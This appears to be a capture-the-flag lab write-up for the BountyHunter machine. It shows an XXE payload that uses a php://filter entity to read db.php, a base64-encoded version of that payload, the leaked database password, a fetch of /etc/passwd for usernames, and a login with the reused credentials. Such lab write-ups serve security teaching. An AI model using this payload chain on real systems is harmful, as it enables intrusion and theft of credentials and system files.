# user

## xxe vulnerability

````xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
		<bugreport>
		<title>qdadaTitle &xxe;</title>
		<cwe>qdadaCWE</cwe>
		<cvss>qdadaCVSS Score</cvss>
		<reward>$29.99</reward>
		</bugreport>
````
- recall that fuzzing had discovered <span class="myTurquoise"><b>portal.php</b></span> and <span class="myTangerine"><b>db.php</b></span>
- <span class="myTurquoise"><b>portal.php</b></span> had yielded an xml formatted method of data exchange.
- now, that xml is modified to test the vulnerability by reaching for <span class="myTangerine"><b>db.php</b></span> discovered through fuzzing earlier.

## encoding the vulnerability

![](src/BountyHunter.HTB-07.gif)

````bash
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIHJlcGxhY2UgWzwhRU5USVRZIHh4ZSBTWVNURU0gInBocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9ZGIucGhwIj4gXT4KICAgICAgICA8YnVncmVwb3J0PgogICAgICAgIDx0aXRsZT5xZGFkYVRpdGxlICZ4eGU7PC90aXRsZT4KICAgICAgICA8Y3dlPnFkYWRhQ1dFPC9jd2U+CiAgICAgICAgPGN2c3M+cWRhZGFDVlNTIFNjb3JlPC9jdnNzPgogICAgICAgIDxyZXdhcmQ+JDI5Ljk5PC9yZXdhcmQ+CiAgICAgICAgPC9idWdyZXBvcnQ+Cgo=
````
- the xxe is encoded into a base64 payload


![](BountyHunter.HTB-08.png)

- the urlencode base64 payload replaces the value for the data parameter
- what returns is the base64 encoded content for <span class="myTangerine"><b>db.php</b></span>

![](BountyHunter.HTB-08.1.png)
````php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
````



![](BountyHunter.HTB-09.png)
- using a similar method, /etc/passwd is fetched to arrive at possible usernames for the discovered credentials
- two accounts have access to bash; <span class="myTurquoise"><b>root</b></span> and <span class="myTangerine"><b>development</b></span>.



![](BountyHunter.HTB-10.png)
- credentials <span class="myYellow"><b>development</b></span>  :  <span class="myYellow"><b>m19RoAU0hP41A1sTsq6K</b></span> are able to logon